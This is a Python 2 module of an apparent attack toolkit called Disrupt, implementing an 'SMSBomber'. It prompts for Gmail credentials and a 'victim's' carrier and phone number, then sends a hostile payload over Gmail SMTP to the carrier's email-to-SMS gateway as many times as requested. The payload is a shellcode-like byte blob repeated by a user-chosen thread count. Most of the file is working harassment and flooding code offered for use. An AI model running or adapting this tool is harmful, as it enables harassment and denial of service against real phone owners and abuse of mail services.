#!/usr/bin/python
#----------------------------------------------------------------------------
#						 Main Disrupt SMSBomber Modules 
#----------------------------------------------------------------------------
#The MIT License (MIT)
#
#Copyright (c) 2015 Matt Perez
#
#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in
#all copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
#THE SOFTWARE.
import sys
import getpass
import smtplib as s

from modules.utility.options import *
from modules.utility.colors import *
from disrupt import *

packet = """
		\xe4\xff\xff\x2f\xb5\xee\xe8\xb3\xa3\xe4\xf6\x48\xe8\xad\xf8
		\x6a\x4f\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb7\x3d
		\x52\x0c\x7f\x9c\x3c\x6f\x9d\x73\xe5\x31\x26\xaa\xa3\xb6\xdf
		\xd0\xb8\x8a\xe7\xde\x86\xc2\x9c\x38\x1b\x01\xcc\x84\xb5\x11
		\x8d\x39\x78\x30\xac\x3f\x55\xcd\xff\xaf\x3c\x6f\xbd\x73\xf5
		"""

def SMSBomb():
    gmail_username = raw_input('\n\t[!] Enter Secure Gmail: ') 
    gmail_password = getpass.getpass(prompt='\t[!] Enter Secure Pass: ')
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    msg_from = '\x6a'
    msg_subject = '\x6a' 
    #Fix menu issue
    print"""
	[1] AT&T
	[2] Boost Mobile
	[3] MetroPCS
	[4] Sprint
	[5] T-Mobile
	[6] Virgin Mobile
	[7] Verizon
	"""
    sms_carrier = raw_input('\t[!] What is the victims phone carrier: ')
    if sms_carrier == '1':
        carrier = "@txt.att.net"
    elif sms_carrier == '2':
        carrier = "@myboostmobile.com"
    elif sms_carrier == '3':
        carrier = "@mymetropcs.com"
    elif sms_carrier == '4':
        carrier = "@messaging.sprintpcs.com"
    elif sms_carrier == '5':
        carrier = "@tmomail.net"
    elif sms_carrier == '6':
        carrier = "@vmobl.com"
    elif sms_carrier == '7':
        carrier = "@vtext.com"
    msg_to = raw_input('\t[!] What is the victims number: +')+str(carrier)  
    thread_count = raw_input('\t[!] How many threads: ')
    msg_text = '\xd7\x30'*40 + packet*int(thread_count)
    thread_send = raw_input('\t[!] How many times would you like to send the thread: ')
    thread_sending = ("%s%s%s" % (gmail_username, "" .join(msg_to), "" .join(msg_text)))
    session = s.SMTP(smtp_server, smtp_port)
    session.ehlo()
    session.starttls()
    session.ehlo()
    session.login(gmail_username, gmail_password)
    for i in xrange(int(thread_send)):
    	session.sendmail(msg_from, msg_to, thread_sending)
    	print'[!] Threads sent: %s bytes to: %s' % (len(packet),msg_to)
    session.quit()
    reset_smsbomber_module = raw_input("\nWould you like to send some more threads (Y/n): ")
    if reset_smsbomber_module == 'Y' or reset_smsbomber_module == 'y':
    	SMSBomb()
    elif reset_smsbomber_module == 'n' or reset_smsbomber_module == 'N':
    	sys.exit()
    	

if __name__ == '__main__':
	SMSBomb()